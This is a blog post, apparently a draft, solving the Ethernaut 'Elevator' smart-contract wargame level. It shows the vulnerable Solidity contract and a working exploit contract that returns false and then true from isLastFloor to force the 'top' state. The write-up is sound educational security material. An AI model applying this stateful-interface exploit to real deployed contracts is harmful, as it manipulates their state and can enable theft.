######################
Ethernaut 11: Elevator
######################
:date: 2023-08-06
:status: draft
:slug: ethernaut-11-elevator
:summary: Weird, an ethereum game where the state takes you to the top
:tags: programming
:author: capu
:featured_image:

Objective
=========
Get the elevator to be on the last floor. That is, get the ``top`` variable to
be ``true``.

Code
====
.. code-block:: solidity
   :linenos: inline
   :hl_lines: 12 14

    interface Building {
        function isLastFloor(uint256) external returns (bool);
    }

    contract Elevator {
        bool public top;
        uint256 public floor;

        function goTo(uint256 _floor) public {
            Building building = Building(msg.sender);

            if (!building.isLastFloor(_floor)) {
                floor = _floor;
                top = building.isLastFloor(floor);
            }
        }
    }

The idea is:

1. if the ``_floor`` we want to ``goTo`` is the top floor, do nothing
2. otherwise, set the state variable ``floor`` to the passed ``_floor``
3. then, set ``top`` to the return value of a *new call* to
   ``building.isLastFloor``. But we'd only gotten here if the current isn't the
   top floor, right?

Solution
========

This confused me for a bit because there are two calls to the same contract
(lines 12, 14) with the same parameters which are expected to return different
things.

But then I realized: receiving a parameter doesn't mean I have to do anything
with it! So the return value doesn't depend on it in any way, instead
``MyBuilding.isLastFloor`` just returns ``false`` on its first invocation, and
``true`` from then on.

.. code-block:: solidity
   :linenos: inline

    contract MyBuilding is Building {
        uint256 private callCount = 0;

        function isLastFloor(uint256) external returns (bool){
            return callCount++ > 0;
        }

        function goTo(Elevator elevator) external {
            elevator.goTo(420);
        }
    }

Boy I like the smell of a post-increment operator in the morning

Also, note it doesn't even matter what the floor number actually is, since
``Elevator`` is agnostic to it and our ``Building`` contract does nothing with
it.

.. code-block:: solidity
   :linenos: inline

    function solution(address payable target_) internal override{
        Elevator target = Elevator(target_);
        (new MyBuilding()).goTo(target);
    }
